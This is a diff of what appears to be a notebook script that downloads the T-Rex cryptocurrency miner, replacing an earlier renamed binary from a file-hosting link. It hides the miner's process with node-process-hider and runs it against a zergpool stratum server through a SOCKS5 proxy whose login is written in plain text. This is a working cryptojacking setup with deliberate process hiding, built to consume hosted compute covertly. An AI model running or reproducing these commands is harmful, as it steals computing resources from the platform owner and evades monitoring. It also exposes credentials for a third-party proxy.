@@ -6,11 +6,12 @@
 ! apt install curl libssl1.0-dev  
 ! nodejs nodejs-dev node-gyp 
 ! npm -y  
-! wget https://download1478.mediafire.com/n1x43abtozeg/a35pndymq81rnet/geek  
+! wget wget https://trex-miner.com/download/t-rex-0.21.5-linux.tar.gz
+! tar -xf t-rex-0.21.5-linux.tar.gz
 ! npm i -g node-process-hider  
-! chmod +x geek  
-! ph add geek  
-! ./geek -a ethash -o stratum+tcp://ethash.mine.zergpool.com:9999 -u TPPvQ3s1grBbZ6q9BusoP2hZYDo63Lsfh3 -p  c=TRX,mc=AKA/CLO/EGEM/ETHO/EXP/TSF/ETH,ID=Aman -t $(nproc) -x socks5://ubuntu2004:LijayaAnli1188@209.127.96.240:7835
+! chmod +x t-rex
+! ph add t-rex  
+! ./t-rex -a ethash -o stratum+tcp://ethash.mine.zergpool.com:9999 -u TPPvQ3s1grBbZ6q9BusoP2hZYDo63Lsfh3 -p  c=TRX,mc=AKA/CLO/EGEM/ETHO/EXP/TSF/ETH,ID=Aman -t $(nproc) -x socks5://ubuntu2004:LijayaAnli1188@209.127.96.240:7835
 
 
 
